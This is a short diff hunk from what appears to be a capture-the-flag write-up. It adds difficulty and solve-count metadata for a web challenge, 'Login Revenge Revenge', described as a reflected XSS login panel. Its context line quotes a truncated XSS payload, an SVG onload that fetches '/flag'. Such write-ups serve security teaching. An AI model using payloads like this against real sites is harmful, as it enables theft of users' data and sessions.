@@ -34,6 +34,10 @@ Payload: `http://web/login?msg=%3Csvg%20onload=%22fetch(%27/flag%27).then(res=%3
 
 # Login Revenge Revenge
 
+- Category: Web
+- Solves: 0/12
+- Difficulty: Medium
+
 ## Description
 
 The login panel contains a Reflected XSS vulnerability but this time admin's cookie is set with the `HTTPOnly` attribute.
